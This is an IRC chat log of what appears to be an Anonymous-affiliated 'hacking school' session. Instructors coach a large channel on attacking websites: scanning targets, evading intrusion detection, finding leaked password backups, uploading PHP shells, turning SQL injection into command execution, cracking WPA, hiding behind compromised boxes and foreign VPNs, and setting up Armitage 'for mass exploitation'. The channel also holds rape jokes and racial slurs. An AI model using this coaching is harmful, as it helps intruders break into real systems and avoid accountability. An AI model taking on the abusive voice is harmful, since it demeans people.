20:28 <@xplicit> please don't get it to me Fox i'm far to noobish to fake being cool
20:28 <+Backslash> lol
20:28 <@xo> o god
20:28 <@xo> inb4 100 pms
20:28 <+lucky225> lol
20:28 <+Backslash> Good look xo
20:28 <@xo> why would u do this to me fox?
20:28 <@xo> why
20:28  * xo sobs
20:28 <@xplicit> it's because we <3 you xo 
20:28 <+Backslash> I can barely deal with 10 pms lol
20:28 <&Fox> uh oh
20:28 <@xo> I ONLY HIT U CUZ I LOVE U SO MUCH
20:28 <@xo> I ONLY HIT U CUZ I LOVE U SO MUCH
20:28 <@xo> I ONLY HIT U CUZ I LOVE U SO MUCH
20:29 <%d1zzY> thx
20:29 <@xplicit> I ONLY RAPE U CUZ I LOVE U SO MUCH
20:29 <@xplicit> I ONLY RAPE U CUZ I LOVE U SO MUCH
20:29 <@xplicit> I ONLY RAPE U CUZ I LOVE U SO MUCH
20:29 <@xplicit> I ONLY RAPE U CUZ I LOVE U SO MUCH
20:29 <&Fox> Dizzy get anyone that needs +v or +h
20:29 <&Fox> Anyways
20:29 <@xo> someone mentioned cryptography
20:29 <+dagon> i did
20:29 <@xo> i kno u did
20:29 <@xo> it doesnt matter who tho
20:29 <@xo> lol
20:29 <+dagon> <3
20:29 <@xo> can u be more specific?
20:30 <+dagon> just the basics, it's something i've been looking forward to learning
20:30 <+lucky225> anyways I guess I can answer Qs here and there 
20:30 <&Fox> Also 6K List of vulns is being offered up here shortly....
20:30 <+dagon> so if there's someone knowledgeable here, i'd like to hear
20:30 <&Fox> Stay tuned.
20:30 <+dagon> it's something relevant for web anonimity as well
20:31 <@xo> dagon: so how to implement encryption solutions?
20:31 <@xo> not so much
20:31 <@xplicit> dagon: As for the basics can you be more specific as to what about it? Like do you know anything about cyrptography?
20:31 <@xo> the nitty gritty
20:31 <@xo> numbers bhind it
20:31 <@d1zzY> People who want to ask questions get +v?
20:31 <&Fox> Yes
20:31 <&Fox> Ok
20:31 <+patri0t> filter the questions d1zzY 
20:31 <@xo> i can run down some basic shit, i think hatter knows more about crypto than other staff
20:31 <&Fox> So you all want to know how to case a target
20:31 <&Fox> xo, case targeting?
20:31 <@d1zzY> one sec..
20:31 <@d1zzY> make questions relevant to the topic
20:31 <&Fox> Fuck it.
20:31 <&Fox> Topic
20:31 <@d1zzY> and post the question to me first
20:31 <&Fox> Targeting a site.
20:32 <@d1zzY> and then ill +v to ask a teacher
20:32 <&Fox> Thats what you fucks are here for isn't it?
20:32 <+lucky225> copy cat white hats, seems to be working for them :)
20:32 <@xo> haha
20:32 <&Fox> d1zzY: Get me some fucking questions.
20:32 <+Backslash> Oh, thanks for voice Fox :-)
20:32 <&Fox> Np.
20:32 <@xplicit> dagon: I can give you the run down of Symetric vs Asymetric cryptography
20:32 <&Fox> Or PM me with questions
20:32 <&Fox> I don't give a fuck
20:32 <@d1zzY> hypotenuse: 
20:33 <+lucky225> ^ same.
20:33 <@d1zzY> sorina
20:33 <@d1zzY> Sorinan: 
20:33 <+anon9819823> And if you need help with algorithms, handshakes, authentication, I could help you out
20:33 <@d1zzY> Sorinan: Am0s hypotenuse  You have voice, ask your questions
20:34 <+anon9819823> I've build some very simple crypto cyphers in c, never anything too complex.
20:34 <@xo> anon9819823: 
20:34 <+dagon> what is the subject atm?
20:34 <@xo> easy answer
20:34 <@xo> dont write your own crypto
20:34 <@xo> unless you relaly know what youre doing
20:34 <@xo> youll do it wrong
20:34 <&Fox> Ok, got kids asking about shit of how to start finding shit within a site
20:34 <@xo> there are good libraries out there
20:34 <&Fox> Easiest answer.
20:34 <@xo> you just need to know how to apply them
20:34 <@xo> but if you arent a srs crypto nerd, dont run out and write your own RSA algo
20:34 <&Fox> Google.
20:34 <+lucky225> SQL injection and view source :)
20:34 <&Fox> Lol
20:34 <+syria> Here's a good one: How to scan a site? (within Fox's proposed topic of targeting a site)
20:35 <@xo> ah
20:35 <@xo> ok
20:35 <&Fox> alright, well if you're me.
20:35 <@xo> so
20:35 <&Fox> or xo
20:35 <+Backslash> xo's right, I learnt that the hard way when I found a major flaw in my own crypto alogorithm :/
20:35 <&Fox> We love google.
20:35 <@xo> ^
20:35 <@m4tr1c3s> google <3
20:35 <&Fox> We like google a fuckload.
20:35 <@xo> google hacking is powerful, even for targetting a certain site
20:35 <&Fox> You cunts know about googledorking?
20:35 <@xo> ell Fox 
20:35 <+Sorinan> Simple question: ppl are really discovering zerodays everyday or most of attacks are just scriptkiddies with luck?
20:35 <@xo> he means
20:35 <@xo> when you have a target
20:35 <+anon9819823> I agree with Backslash.  It's not the best idea for security.
20:35 <+lucky225> site:domain.com
20:35 <+lucky225> ftw
20:35 <@xo> Sorinan: they are
20:36 <&Fox> FUCKYOU KIDS CAN GOOGLE GOOGLEDORKS
20:36 <&Fox> and get shit
20:36 <@xo> its easier than you think to find 0days
20:36 <@m4tr1c3s> 'imdex of'
20:36 <@xo> just takes some persistence
20:36 <@m4tr1c3s> index
20:36 <+lucky225> lol @ free school, where you learn to google :D
20:36 <&Fox> lucky225: is right, in the past, we've shown you can find fucking full identities hidden inside of the bowels of google.
20:36 <@xo> Fox: we covered dorking
20:36 <&Fox> xo
20:36 <&Fox> We have 300+ people here
20:36 <@xo> tru
20:36 <@xo> but
20:36 <&Fox> we're going to need to be a bit redundant.
20:36 <@xo> @syria
20:36 <@xo> once you have a target
20:36 <@xo> basically yo uwanna enumerate
20:36 <@xo> every possible attack vector
20:37 <@xo> every service that is running
20:37 <@xo> every possible place you can cram data into the box
20:37 <@xo> do some recon
20:37 <@xo> port scan the box
20:37 <@xo> if theres a webpage
20:37 <+Sorinan> And about botnets, they are common or is a really big achievement to build a useful one?
20:37 <@xo> find all the input vectors, any pages tucked away
20:37 <+dagon>  /r/ing a solo teacher for the purpose of avoiding desorientation
20:37 <&Fox> yeah
20:37 <+dagon> and making questions easier
20:37 <&Fox> xo has got this 
20:37 <+syria> directly to the server, yes - the question was more off - how should one go about scanning a site for holes in security, places to attack, easy exploits
20:38 <&Fox> There you go buddy ;)
20:38 <@xo> syria: ah
20:38 <+syria> not my question btw
20:38 <@xo> well
20:38 <@xo> youre talking about looking for simple, known exploits in a server?
20:38 <+syria> any place
20:38 <+lucky225> metasploit.
20:38 <@xo> ^
20:38 <@xo> i was typing that out
20:38 <@xo> haha
20:38 <+lucky225> :)
20:38 <&Fox> +v's shut the fuck up for a bit.
20:38 <&Fox> or lose it.
20:39 <+syria> person who asked question: besides holes in mysql and shit how can you find a place to attack/exploit
20:39 <@xo> depends what services are running
20:40 <@xo> sometimes its really simple shit
20:40 <@xo> like
20:40 <@xo> they didnt setup the permissions on their ftp right
20:40 <+syria> ex. plesk or drupal
20:40 <@xo> or used a stupid password
20:40 <@xo> or, ex. once your in
20:40 <@xo> syria: hm?
20:40 <@xo> both of those are web apps
20:40 <@xo> are you asking how to attack webapps?
20:40 <+newbie> thanks bro :)
20:40 <+syria> i know but that's what he's saying
20:41 <@m4tr1c3s> for sites: you can use wget recursively with a mirror option to download an entire site and make all the links work. may or may not be useful for pen testing
20:41 <+syria> just keep going and I'll tell him about webapps
20:41 <@xo> haha ok
20:41 <@xo> im kinda confuesd but whatever, ignoring
20:42 <+syria> keep on :D lol 'tis a newb seeking knowledge
20:42 <@xo> but yeah, if you never find the vector
20:42 <@xo> youll never be able to exploit it
20:42 <@xo> even if its exploitable
20:42 <@xo> that shitty cgi script
20:42 <@xo> that admin forgot about
20:42 <+turbopinko> portscan > open service > exploit
20:42 <@xo> you wanna find it
20:42 <@xo> the service running on some rly high port
20:42 <@xo> the old version of their site
20:42 <@xo> they left lying around
20:42 <@xo> the .php.bak files
20:43 <@xo> w/ their mysql passwords
20:43 <@xo> dig around, sometimes the best hack isnt very hard haha
20:43 <@m4tr1c3s> lulzsec showed us that
20:43 <+syria> his follow up to that: what directory would those stuff typically be in - where is the most common place to find those
20:43 <@xo> might be as simple as
20:43 <@m4tr1c3s> syria:
20:43 <@xo> they let u upload arbitrary files
20:44 <@xo> or the permissions on their upload directory arent setup right
20:44 <@m4tr1c3s> you can download lists of vulnerable/interesting directories
20:44 <@xo> overwrite other peoples files, upload scripts etc
20:44 <@xo> syria: to find what?
20:44 <+FoxInSocks095> +v
20:44 <@m4tr1c3s> vuln dirs on sites
20:44 <+syria> ^
20:44 <@xo> ah, well theres no catch all place to find vulns
20:44 <@xo> depends on the site
20:45 <+Backslash> ^
20:45 <@xo> check for comments in html
20:45 <@xo> might find links to old pages
20:45 <@xo> cgi-bin
20:45 <+FoxInSocks095> @xo:
20:45 <@xo> sometimes has fun stuff
20:45 <@xo> u wont get a directory listing usually
20:45 <@xo> tho
20:45 <@xo> FoxInSocks095: ?
20:46 <+anon9819823> Easiest way: Upload a php shell script.  :D
20:46 <&Fox> Ok
20:46 <&Fox> xo
20:46 <+Backslash> c99.php
20:46 <&Fox> Reign this shit in
20:46 <@xo> Backslash: haha 
20:46 <+FoxInSocks095> yes why to create a shell
20:46 <@xo> yeah
20:46 <&Fox> Ok.
20:46 <@xo> sometimes you can find shells other people left
20:46 <&Fox> Fuck.
20:46 <&Fox> Terminal: 
20:46 <&Fox> Help police the goddamn channel
20:46 <&Fox> while i finish organizing this shit
20:46 <~Terminal> Fuck
20:46 <@m4tr1c3s> lol
20:46 <&Fox> I have only been sober for like
20:47 <&Fox> fucking 4 hours. Max.
20:47 <@xo> lol
20:47 <&Fox> Kay?
20:47 <&Fox> goddamn.
20:47 <@m4tr1c3s> hey acid
20:47 <~Terminal> lol
20:47 <&Fox>  /back to pastebin
20:47 <&Fox> Also
20:47 <&Fox> To everyone here
20:47 <&Fox> Chill yourselves for like
20:47 <@xo> OKSO
20:47 <@xo> someone ask me about
20:47 <&Fox> 20 minutes or so, and enjoy the learning
20:47 <@xo> "HTML injection"
20:47 <@xo> which im assuming is XSS
20:48 <~Terminal> just recover'd 14 hrs of travel....
20:48 <@xo> yeah XSS
20:48 <~Terminal> sup m4tr1c3s 
20:48 <&Fox> NIGGA THIS AINT A FUCKING TEAPARTY
20:48 <@m4tr1c3s> a horde is up
20:48 <&Fox> TAKE THAT SHIT TO PM
20:48 <@xo> OSOSOS
20:49 <%Frosty> or #æcademy
20:49 <@xo> i hope that answered your question
20:49 <@xo> look at services running
20:49 <@xo> even the network hardare
20:49 <@xo> between u and the target
20:50 <@xo> nmap will version fingerprint for u
20:50 <@xo> so u can check versions, see if theres known attacks
20:50 <@xo> or at least
20:50 <@xo> what version to grab for research
20:50 <@xo> if youre dedicated enough
20:52 <@xplicit> it's been a long while xo how much better has nmap gotten at version fingerprinting?
20:52 <@xo> its decent
20:52 <@xo> nothin better afaik
20:52 <@xo> also
20:52 <@xo> for attacking webservers
20:52 <@xo> nice tool called nikto
20:52 <+turbopinko> aside from calling the data center
20:53 <@xo> will check a lot of known paths for stupid cgi scripts, various configuration options etc
20:53  * d1zzY Questions?? PM d1zzY
20:53 <%Frosty> what about ids? don't automated tools like nikto just stomp over everything raising alarms everyfuckingwhere?
20:54 <@xo> true
20:54 <@xo> nikto uses libwhisker
20:54 <@xo> which has some ids-evasion options
20:54 <@xo> the most interesting of which is session splicing
20:54 <@xo> essentially breaks up your queries across multiple packets
20:55 <@xo> i cant comment on the effectivness of the other techniques, session splicing can be effective against some IDS and webservers tho
20:55 <@xo> hatter did some tests a while ago
20:56 <@xo> did manage to keep the traffic out of hte logs for some webservers using libwhiskers IDS evasion
20:56 <+turbopinko> interesting
20:56 <+turbopinko> cause im setting up an IDS this week
20:56 <+turbopinko> an nids
20:57 <&Fox> Ok, sorry to interrupt, Kids there is a link in that pastebin to all of our prior talks
20:57 <&Fox> 56 in all
20:57 <&Fox> including web app vulns and things we're covering today, anonymity, 
20:57 <&Fox> con artistry
20:57 <&Fox> social engineering
20:57 <&Fox> how to be fresh
20:57 <&Fox> how to fuck women
20:57 <&Fox> how to fuck shit up
20:57 <%Frosty> ^
20:57 <&Fox> how to ddos
20:57 <+turbopinko> that one was my favorite
20:57 <&Fox> how to fucking set up nets
20:57 <+turbopinko> foxes guide on women fucking
20:57 <%Frosty> with 100% more balls shave
20:57 <&Fox> how to do any god damn thing
20:57 <&Fox> CHECK THAT SHIT
20:58 <&Fox> And PM a nigga if you need a single goddamn thing
20:58 <&Fox> Also, we have a potential guest speaker lurking in here
20:58 <&Fox> someone I know you all want to hear from
20:58 <&Fox> we keep this rolling
20:58 <&Fox> he said he might speak
20:58 <&Fox> might not
20:58 <&Fox> Stop pm'ing me about it already though
20:58 <&Fox> ;)
20:58 <&Fox> xo, please continue.
20:58 <@xo> idk wtf i was talking about
20:58 <@xo> uhhh
20:58 <@xo> orite
20:58 <@xo> IDS evasion in LW
20:58 <@xo> they wrote a paper
20:59 <@xo> on the methods
20:59 <@xo> you can find it if you google
20:59 <&Fox> Xo, bb
20:59 <&Fox> You want to take it oldschool on em
20:59 <&Fox> Like
20:59 <&Fox> First few sessions worth of old school
20:59 <@xo> idk what u mean
20:59 <&Fox> I just got a questions that made me a bit nostalgic.
21:00 <@xo> i have no nostalgia
21:00 <&Fox> How do you take a sql vuln, and take it to something other than a db dump
21:00 <&Fox> :)
21:00 <@xo> oh
21:00 <@xo> well yeah
21:00 <&Fox> You remember LordKitsuna
21:00 <@xo> w/ MSSQL
21:00 <@xo> you can actually exec commands
21:00 <@xo> and you can write files w/ MySQL
21:00 <&Fox> and that fucking whole little net we dropped
21:00 <&Fox> haha
21:00 <@xo> find a dir w/ the right permissions and you can do smth nasty
21:01 <&Fox> SQL Shell.
21:01 <&Fox> :D
21:03 <+dagon> xo, open for a question?
21:04 <&Fox> dagon: 
21:04 <&Fox> sup
21:05 <+dagon> i wanted to ask xo, or any experienced fgt for that matter, in a recon situation, when you're analysing your target, trying to uncover exploits, and subsequently finding nothing, when do you give up?
21:06 <&Fox> When it becomes time ineffective.
21:06 <@xo> dagon: yeah
21:06 <@xo> shoot
21:06 <&Fox> Thats really what it is for me.
21:06 <+dagon> fox: ellaborate?
21:06 <@xo> dagon: depends how much u wanna own the target
21:06 <&Fox> ^^^
21:06 <@xo> if youre just looking for A root
21:06 <@xo> dont waste your time
21:06 <%Frosty> it depends on how much you want to get it
21:06 <@xo> theres boxes you can pop in 10 minutes
21:06 <@xo> once u find em
21:06 <%Frosty> see
21:06 <@xo> if you have a specific target
21:06 <@xo> that you really WANT
21:06 <@xo> also
21:06 <@xo> another thing
21:06 <@xo> shared hosts
21:06 <@xo> other sites on the same box
21:06 <@xo> are targets too
21:07 <+dagon> xo, i see, thanks
21:07 <+dagon> also thx fox

21:08  * xo bookmarks
21:08 <@xplicit> dagon: You've also got to take into consideration that any target can be comprimised with the right experience and knowledge. That's why a White hat IT admins worst fear is "hackers" because they believe we have no life and have nothing but time, which is not true for anyone
21:08 <%Frosty> http://serversniff.net/index.php while we are here
21:08 <@xo> its true for me, xplicit 
21:08 <@xo> all i do is view pornography
21:08 <@xplicit> yea xo that's because you're a loser <3
21:09 <@xo> and autit source code
21:09 <@xo> to piss off white hats
21:09 <@xplicit> some of us have a life :3
21:09 <@xo> audit*
21:09 <@xo> and WoW
21:09 <&Fox> :3
21:09 <@xo> ofc
21:09 <@xo> and WoW themed porn
21:09 <@xo> ofc
21:09 <@d1zzY> lol
21:09 <@xplicit> and by a life I mean a fiance ofc
21:09 <&Fox> Next question.
21:09 <@Backslash> Fox <3 - thanks for the link to yougetsignal.com - very useful!
21:09 < l3g10n> wtf!sqli?
21:09 <&Fox> What you wanna learn nigs
21:09 <@xo> is that a question, l3g10n ?
21:10 <&Fox> Cmon
21:10 <@xo> xplicit: i have a fiance, shes tied up in the basement
21:10 < l3g10n> carry on dude.
21:10 < mook> what is telnet good for?
21:10 <@xplicit> fox without reinstalling maltevo why the fuck won't it work?
21:10 <@xo> mook: not much
21:10 < mook> figures
21:10 <@xo> you wanna use
21:10 <@xo> netcat
21:10 <&Fox> xplicit: depends
21:10 <@xo> for hte most part
21:10 <@xo> since telnet does quirky things
21:10 <&Fox> Netcat > telnet
21:10 < l3g10n> +m and continue.
21:10 <@xo> that arent usually helpful
21:10 < mook> xo: interesting thanks
21:10 <@xo> now
21:10 <@xo> whats even better
21:10 <@xo> than nc
21:10 <@xo> is ncat
21:10 <@xo> the netcat tool that ships w/ nmap 5
21:10 <@xo> it supports ssl
21:10 <@xo> :3
21:10 <@xplicit> depends on what?
21:11 < mook> thanks for discussing this
21:11 < l3g10n> nmap is lame,however try to over flood index php
21:11 <@xo> nmap isnt lame
21:11 <@xo> its a good tool
21:11 < ph0enix> ^
21:11 < FoxInSocks477> so where is this blackhat shit
21:11 < FoxInSocks614_> How is it VPNs are safe, if the source is raiding won't logs be kept?, even if the owner says they don't, they probably do, how can you put your trust in something without knowing absolutely it's safe?
21:11 < r4f3> could i ask a question?
21:11 < mook> can neat commands run out of a unix shell like the telnet command?
21:11 < mook> neat = ncat
21:11 <@xo> FoxInSocks614_: the idea is
21:11 < l3g10n> it scan only tcp lame!
21:11 <@xo> either they dont keep logs
21:12 <@xo> which i wouldnt trust
21:12 < FoxInSocks909> How can I upload a shell to an aspx website when there are no code allowing fileuploads in the website?
21:12 <+dagon> +m
21:12 <@xo> or that it being in a foreign country
21:12 <@xo> makes it hard to persue
21:12 <@xo> legally
21:12 < Shaggy> oh lol
21:12 < Shaggy> like i wanted to ask, DNS hijacking?
21:12 <@xo> if you bounce your traffic through 2 or 3 countries
21:12 <+turbopinko> russian vpns for the win
21:12 <@xplicit> xo can you punch my dog in the face and make her shut up. It's annoying me, and I don't feel like being mean
21:12 <@xo> imagine the amount of paperwork etc
21:12 < l3g10n> continue please.
21:12 <@xo> that would have to go into tracking you down
21:12 <@xo> plus if its a country like
21:12 <@xo> russia
21:12 <@xo> you think russian LEO gives 2 fucks
21:12 <+turbopinko> ^^
21:12 < l3g10n> lol
21:12 <@xo> about raiding some DC cause america told them to
21:12 < FoxInSocks493> I had a question about hacking into WPA2 wireless networks.
21:13 < FoxInSocks493> I had a question about hacking into WPA2 wireless networks.
21:13 <+turbopinko> russia will get the paper work and wipe there ass with it
21:13 < l3g10n> http://serversniff.net/index.php
21:13 <@xo> exactly
21:13 <@xo> so, the point really isnt
21:13 <@xo> do they keep logs
21:13 <@xo> know hat to really know
21:13 <@xo> regardless
21:13 <@xo> of what they advertise
21:13 <@xo> or their TOS
21:13 < FoxInSocks171> lol
21:13 <@xo> the idea is to bounce your traffic around enough
21:13 < FoxInSocks226> Russian leo gives a fuck for small amount of monet
21:13 <@xo> tracking it just becomes unfeisible
21:13 < Shaggy> whta bout DNS hijacking?
21:13 <&Fox> who wants to see the jester in here
21:14 < mib_9qj41q> wouldn't that depend on how bad they want you?
21:14 <&Fox> lololol
21:14 < FoxInSocks226> For ex list of phone calls cost 10$
21:14 <@xo> it would
21:14 <+dagon> someone +m
21:14 < Shaggy> if i got root to a box how could i take the whole DNS line
21:14 < Shaggy> ?
21:14 < lovely> will he be raped fox?
21:14 <@xo> Shaggy: ???
21:14 <@xo> can you rephrase that?
21:14 < FoxInSocks614_> Thanks that satisfys my question.
21:14 <@m4tr1c3s> dagon: we're still accepting q's i think
21:14 < l3g10n> I want to recrut 10000 people to join Anonymous till 5th november!
21:14 < FoxInSocks493> Is it possible to break into WPA2 connections? Being that they're "so secure"
21:14 <%Frosty> +m ?
21:14 < FoxInSocks707> Hai
21:14 <+dagon> but it's getting confusing, xo should answer when +m is in place
21:14 <@xo> ok
21:15 <@xo> FoxInSocks614_: i think it depends on the auth method, but im not an expert on the matter
21:15 <@xo> Fox: do you kno anything about WPA? two people have asked
21:15 <&Fox> yup
21:15 <&Fox> A little
21:15 <@xo> gogogogo
21:15 <&Fox> I'm rolling a blunt
21:15 <&Fox> Sec.
21:15 <@xo> idc
21:15 <@xo> go
21:15 <+turbopinko> its probably easier to social the password
21:15 <&Fox> Fucking cunts
21:15 <+turbopinko> ive socialed a few enterpise networks
21:15 <+turbopinko> for wpa
21:15 <@xo> blunts are for niggers
21:15 <&Fox> ok
21:15 <&Fox> so
21:15 <@xo> smoke marihuana cigarettes
21:15 <@d1zzY> xo: i know that to crack WPA via aircrack, you intercept packets until you capture the 4-way handshake and then use rainbow tables to crack
21:16 <&Fox> d1zzY: 
21:16 <&Fox> ilove you
21:16 <&Fox> going back to rolling
21:16 <+JackofCoins> Wait sorry about the late question but -- Is it possible to bounce your conection to more than just One VPN and One Tor Connection Proxy?
21:16 <@xo> yeah
21:16 <@xo> you can connect to a proxy
21:16 <@xo> or tor
21:16 <@m4tr1c3s> that's recommended
21:16 <@xo> through a vpn
21:16 <@xo> i mean ideally
21:16 <+turbopinko> though with every connection your gonna get some lag
21:16 <@xo> use a comped box
21:16 <@xo> for a proxy
21:16 <+turbopinko> ^^
21:16 <@m4tr1c3s> vpn - proxy - proxy - vpn is a good one
21:16 <@d1zzY> JackofCoins: yes...you can write a script to change your tor exit node every 5 sec if you want
21:16 <@xo> or pay for a proxy w/ e-gold
21:16 <+JackofCoins> Do I need a special browser plugin to use multiple proxies?
21:17 <@xo> yeah
21:17 <@xo> you can setup your own
21:17 <@xo> tor net
21:17 <@xo> w/ roots
21:17 <@xo> round robin the exit nodes
21:17 <+JackofCoins> I see yea
21:17 <@xo> if u wana git fancy
21:17 <@xo> :3
21:18 <@m4tr1c3s> yo xo
21:18 <@m4tr1c3s> any more advice on recon?
21:18 <+JackofCoins> So say I have root on xxx system, I can SSH to it , then use the SSH shell to SSH to yyy system, and so on?
21:18 <@m4tr1c3s> yes
21:19 <@xo> nah
21:19 <+turbopinko> is cve the best place to find vulns?
21:19 <@xo> recon is just a matter of being persistent
21:19 <@xo> mostly
21:19 <@m4tr1c3s> kk
21:19 <%Frosty> cve = ?
21:19 <%McGarnigle> maltego is a useful tool for recon
21:20 <+dagon> xo, can you sort of describe your proccess from the moment you choose a target?
21:21 <+MrWonderful> isnt ssh vulnerable to mitm attack?
21:21 <@xo> only w/ the proper access
21:21 <@d1zzY> %
21:21 <@d1zzY> ^*
21:21 <@xo> youll get an angry message too

21:39 < PlusPurdge_> i know how to programm on c++, java and c#
21:39 <+JackofCoins> I just want to know about networking in general not how to use someone elses programs...
21:39 < Masterdiabolo> i wanna learn too
21:39 <@d1zzY> or you can come here and write your own script to inject statements
21:40  * f[11111011] stabs Java
21:40 < Shaggy> lolol
21:40 < PlusPurdge_> lawl that sounds good

21:40 <&Fox> You kids know what metasploit is right?
21:40 <@xo> hack into makes it sound more active a process than it really is
21:40 < Mokofix> ??

21:40 < PlusPurdge_> how can i use networking
21:40 < Masterdiabolo> yeah
21:40 <@ErrProne> i know how to use metasploit
21:40 <@ErrProne> omg
21:40 <@xo> metasploit is an exploitation framework
21:41 < Shaggy> a little idea
21:41 < PlusPurdge_> to hack a port and execute commands on that port to get actual remote control of a pc?
21:41 < Masterdiabolo> can download it from taringa or sites like that
21:41 < Shaggy> i'm more of a, beat a server with a bat type of guy

21:42 <@d1zzY> JooblieJoo: google 
21:42 < lucky225> wouldn't that be +m for marijuana?
21:42 <@xo> metasploit is a tool for developing and executing exploits. it also has exploits included with it
21:42 < PlusPurdge_> ow lol
21:42 < Shaggy> www.lmgtfyhttp://tinyurl.com/3uqy6zp
21:42 < Shaggy> http://tinyurl.com/3uqy6zp
21:42 < f[11111011]> My skript says 9973 is a prime number
21:42 < PlusPurdge_> so i can use metasploit to make my own scripts to
21:42 < PlusPurdge_> to
21:42 < PlusPurdge_> too
21:42 < Masterdiabolo> you can download it from taringa
21:42 < PlusPurdge_> didnt know that
21:42 <%McGarnigle> Install metasploit to be able to follow along the upcoming class  http://www.metasploit.com/download/
21:42 < l3g10n> metasploit is lame all hacking programs from google are legal and lame,it can't be used for hacking,+m and continue...
21:43 < L> you're dumb
21:43 < sharp> seconded
21:43 < Xeross> xo: Wouldn't pretty much every popular distro have patched those priv. escalation exploits?
21:43 < l3g10n> <@xo> +m and continue...
21:43 <@d1zzY> kljfdkjl;edsjk;lkj987yuhi
21:43 <@xo> Xeross: not if they dont update
21:43 <@d1zzY> ^^sorry...my son joined the party 8-)
21:43 < Shaggy> and who updates?
21:44 <@xo> competent admins
21:44 <@xo> but plenty dont
21:44 <@d1zzY> ^^number one rule: ALWAYS BE UP TO DATE
21:44 < Shaggy> prob %70 dont upgrade
21:44 < Shaggy> or maybe more
21:44 <@d1zzY> ^ it's sad
21:44 < Shaggy> it's funny!
21:44 < FoxInS60> how do people usually rtrafede public keys?
21:44 <+JackofCoins> Every time I logon to ubuntu theres about 2hrs of updates lol
21:44 <@xo> so i mean, in theory, every box should be up2date and secured against these attacks
21:44 < Shaggy> i always keep everything up to date
21:44 <@xo> but not always the case
21:44 <%McGarnigle> some CAN'T upgrade due all the shit that breaks...
21:44 <&Fox> Ok
21:44 < FoxInS60> *trade
21:44 <&Fox> second blunt

21:45 < Shaggy> damn fox, you KILLINg it today
21:45 <@d1zzY> lol
21:45 < JooblieJoo> o.k., so if metasploit is so lame for ???? reason, what's the point in reviewing it?
21:45 <%McGarnigle> Install metasploit to be able to follow along the upcoming class  http://www.metasploit.com/download/
21:45 <@m4tr1c3s> it is not useless
21:45 < Toolbeard> I wish that OpenSolaris would take off.
21:45 < L> it isn't lame, he's an idiot
21:45 <+JackofCoins> Many corporations rely on a system structure required to run their business that doesnt work with new updates
21:45 < Anon900> anyone tried ARMITAGE yet?
21:45 < l3g10n> Help with index.php flood?<@xo>
21:45 < Anon900> i works ok for mee

21:45 <@xo> plz
21:46 < daemon>  
21:46 < FoxInSocks852> should i install metasploit minimal or full setup
21:46 < Hjaldrgod> Learning all this would be brilliant, is there anyway a person like myself need to prepare before the lessons start?
21:46 <@xo> yeah msfconsole isnt hard
21:46 <@xo> FoxInSocks852: full

21:47 < l3g10n> wtf ru mad?
21:47 <&Fox> what

21:48 <&Fox> HOLY FUCK
21:48 < JooblieJoo> @&Fox, how much more time till lesson starts?  (wondering if I got time to grab a smoke)
21:48 < f[11111011]> I want to run Distributed Net on the NSA's computers
21:48 < L> haha fox
21:48 < Shaggy> about 5minutes?
21:48 < Xeross> SELinux, you won't get in without social engineering
21:48 < Shaggy> start in 7 minutes
21:48 <@xo> eah selinux will break some apps and systems, if you dont configure it right
21:48 <&Fox> 12 min
21:48 < f[11111011]> I want one hour of NSA computer time
21:48 < Shaggy> even better XD
21:48 < JooblieJoo> 12 minutes, cool
21:48 <@xo> most of the time
21:48 < Shaggy> let me retweet it
21:48 <@xo> you wont need selinux
21:48 <@xo> unless you have some specific need
21:48 < school242> cool, 12minute
21:49 < JooblieJoo> smokey and install this framework, and return
21:49 <@xo> for the level of control it provides
21:49 <@xo> not worth the trouble imo
21:49 <@xo> but when you do need it
21:49 <@xo> go for it
21:49 < Shaggy> if you want to smoke, smoke!
21:49 < wHoHo> lol
21:49 < Siouxsie> smoke
21:49 < Shaggy> if you need fod, grab it!

21:49 < Shaggy> school starts in 11 MINUTES!
21:49 <+turbopinko> you can always scroll
21:49 < Am0s> foooood
21:49 <@xo> doing the equivelent in linux alone is either very hard and hacky, or not possible
21:49 <@xo> wish i could remember the name of the stupid shit the kernel supports to do that kinda stuff
21:49 <@xo> but its like. just awful
21:50 < f[11111011]> I have a suggestion, when the class starts +n this channel unless the instructor wants people to ask questions
21:50 < f[11111011]> +m
21:50 < Shad0w> hey guys
21:50 <@xo> yeah
21:50 < Siouxsie> hey

21:50 < justeme> what are we going to learn ?
21:50 < Xeross> I've only had a few minor issues with SELinux on my 14 fedora boxes. It's just a matter of taking the time to configure it
21:50 < m34t> unprespared is my middle name

21:59 <+JackofCoins> shaggy  - Acid_burn is a better name than ZeroCool
21:59 <+L0rd_N1k0n> my name is cooler
21:59 <+L0rd_N1k0n> STFU
21:59 <&Fox> Oh my god
21:59 <&Fox> sexy metasploit.
21:59 <&Fox> SEXY METASPLOIT HACKER
21:59 <@JessicaParker> Now what am I doing here again?
21:59 <@Backslash> Hell yeah
21:59 <&Fox> Ok, kids
21:59 <&Fox> JessicaParker is here
21:59 <+L0rd_N1k0n> skids*
21:59 <&Fox> to help with the metasploit talks
22:00 <@xo> o yay
22:00 <&Fox> :>
22:00 <@JessicaParker> I assume all of you have the metasploit framework installed and are running some unix based operating system correct?
22:00 <&Fox> No. Dont assume that. Lol.
22:00 <&Fox> Just give the talk, as if they did.
22:00 <@Backslash> Sounds good, Fox
22:01 <@JessicaParker> Okay well rather than using msfconsole, we will be using something called 'armitage'
22:01 <@JessicaParker> It's much faster for mass exploitation
22:01 <@d1zzY> hell yeah
22:01 <@d1zzY> i wanted to know more about armitage lol...shuttin up now...
22:01 <@JessicaParker> and lets you map your targets out in a much nicer way
22:01 <@d1zzY> i'm quiet now..sorry =)
22:02 <@JessicaParker> Now I'm using the 4.0 core so the commands have changed since 3
22:03 <@JessicaParker> everyone open a terminal
22:03 <@JessicaParker> and run this
22:03 <@JessicaParker> /opt/framework-3.7.1f/msf3/msfrpcd -P password -U msf -S
22:03 <@JessicaParker> Of course your path will depend on your metasploit dir
22:03 <%FR0STY> /opt/framework3/msf3/msfrpcd
22:04 <&Fox> Oh please forgive the interruption
22:04 <+L0rd_N1k0n> is there a way to make it global?
22:04 <&Fox> Word up to metasploit for a bomb ass party.
22:04 <&Fox> <3
22:04 <&Fox> Continue
22:04 <@JessicaParker> gem install postgres
22:04 <@JessicaParker> when that's installed you WILL need to open a msfconsole
22:05 <@JessicaParker> db_driver postgresql
22:05 <@JessicaParker> in the msfconsole
22:06 <@JessicaParker> exit the msfconsole and fire up armitage
22:06 <@JessicaParker> Hopefully you all won't have to go through as much shit to get it working as I did
22:06 <+JackofCoins> Ok sorry can we go back to that first command, is it Linux/Unix only or do we need to do that in the command line of windows too? 
22:07 <&Fox> JackofCoins: no. If you dont have it now, you'll get it later.
22:07 <@d1zzY> i need to set up a mysql/postgresql server correct?
